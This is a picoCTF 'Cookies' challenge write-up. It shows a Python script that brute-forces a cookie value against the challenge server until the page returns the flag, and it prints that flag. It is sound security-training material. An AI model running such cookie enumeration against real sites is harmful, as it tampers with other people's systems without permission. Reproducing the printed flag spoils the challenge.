**Cookies**

1. The challenge leads us to the following link:
```
http://mercury.picoctf.net:17781/
```

2. This is the prompt with a dialog box and ```Search``` button.
```
Welcome to my cookie search page. See how much I like different kinds of cookies!
```

3. To check, I first type in ```how much``` and get:
```
That doesn't appear to be a valid cookie.
```

4. The URL changes remains:
```
http://mercury.picoctf.net:17781/
```

5. On inspecting the page and checking the cookies, the current cookie has Name ```name``` and value ```-1```.

6. The initial prompt in the dialog box is ```snickerdoodle``` and on typing that:
```
That is a cookie! Not very special though...
I love snickerdoodle cookies!

```

7. On inspecting, the cookie has Name ```name``` and valuue ```0```. The URL changes to:
```
http://mercury.picoctf.net:17781/check
```

8. I tried one more cookie name in the dialog box: ```butter```:
```
That is a cookie! Not very special though...
I love butter cookies!

```

9. On inspecting, the cookie Name is ```name``` and value is ```11```. The URL is:
```
http://mercury.picoctf.net:17781/check
```

10. Thus intuitively, if a correct cookie is entered it has value >= 0. 

11. In terminal, I create file ```vim cookies.py```.

12. ```pip3 install requests```

13. Script:
```
#!/bin/python3
import requests

url = 'http://mercury.picoctf.net:17781/check'  

for i in range(25):  
    cookie = {'name': str(i)}
    response = requests.get(url, cookies=cookie)
    
    if 'picoCTF' in response.text:
        print("Flag found:", response.text)
        break  
```

14. Then it is run: ```python3 cookies.py```

15. Output:
```
Flag found: <!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
```

16. On inspecting output, flag is found:
```
picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}
```

